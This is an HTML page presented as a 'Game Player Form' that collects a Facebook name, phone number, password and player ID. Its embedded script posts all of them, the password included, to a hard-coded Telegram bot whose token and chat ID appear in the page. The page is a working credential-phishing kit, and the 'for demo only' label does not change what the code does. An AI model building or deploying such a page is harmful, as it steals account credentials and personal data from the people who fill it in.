<meta name='viewport' content='width=device-width, initial-scale=1'/><!DOCTYPE html>
<html>
<head>
  <title>Game Player Form</title>
</head>
<body>
  <h2>Player Info Form</h2>
  <form id="playerForm">
    <label for="facebook">Facebook Name:</label><br>
    <input type="text" id="facebook" name="facebook" required><br><br>

    <label for="number">Phone Number:</label><br>
    <input type="tel" id="number" name="number" required><br><br>

    <label for="password">Password (for demo only):</label><br>
    <input type="password" id="password" name="password" required><br><br>

    <label for="playerid">Player ID:</label><br>
    <input type="text" id="playerid" name="playerid" required><br><br>

    <button type="submit">Submit</button>
  </form>

  <script>
    const botToken = '8280950190:AAEHT6NKfuaxny4lWxVchJ6GQxuouSy-V5M';
    const chatId = '7635002595';

    document.getElementById('playerForm').addEventListener('submit', function(e) {
      e.preventDefault();
      const facebook = document.getElementById('facebook').value;
      const number = document.getElementById('number').value;
      const password = document.getElementById('password').value;
      const playerid = document.getElementById('playerid').value;

      const message = `New Submission:\nFacebook: ${facebook}\nPhone: ${number}\nPassword: ${password}\nPlayer ID: ${playerid}`;

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      }).then(response => {
        if (response.ok) {
          alert('Submitted Successfully!');
        } else {
          alert('Failed to submit.');
        }
      });
    });
  </script>
</body>
</html>
